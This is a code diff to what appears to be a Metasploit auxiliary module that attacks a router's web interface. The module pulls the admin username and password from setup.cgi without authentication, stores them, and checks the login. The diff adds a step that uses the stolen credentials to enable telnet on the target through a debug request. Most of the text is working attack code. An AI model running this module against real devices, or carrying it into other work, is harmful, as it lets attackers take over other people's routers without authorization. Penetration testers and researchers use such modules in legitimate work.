@@ -91,12 +91,12 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     res = send_request_cgi(
-      'uri' => '/setup.cgi'
+      'uri' => '/setup.cgi',
+      'method' => 'GET',
       'vars_get' => {
         'next_file' => 'BRS_swisscom_success.html',
-        'x' => 'todo=PNPX_GetShareFolderList',
-      },
-      'method' => 'GET'
+        'x' => 'todo=PNPX_GetShareFolderList'
+      }
     )
 
     unless %r{<DIV class=left_div id=passpharse><span languageCode = "[0-9]+">Admin user Name</span>: </DIV>\s*<DIV class=right_div>([^<]+)</DIV>}.match(res.text)
@@ -117,7 +117,7 @@ class MetasploitModule < Msf::Auxiliary
     print_status('Attempting to retrieve /top.html to verify we are logged in!')
 
     res = send_request_cgi(
-      'uri' => '/setup.cgi?next_file=BRS_swisscom_success.html&x=todo=PNPX_GetShareFolderList',
+      'uri' => '/top.html',
       'method' => 'GET',
       'authorization' => basic_auth(username, password)
     )
@@ -156,5 +156,15 @@ class MetasploitModule < Msf::Auxiliary
     }.merge(service_data)
 
     create_credential_login(login_data)
+
+    print_status("Enabling telnet on the target router")
+    res = send_request_cgi(
+      'uri' => '/setup.cgi',
+      'method' => 'GET',
+      'vars_get' => {
+        'todo' => 'debug'
+      },
+      'authorization' => basic_auth(username, password)
+    )
   end
 end
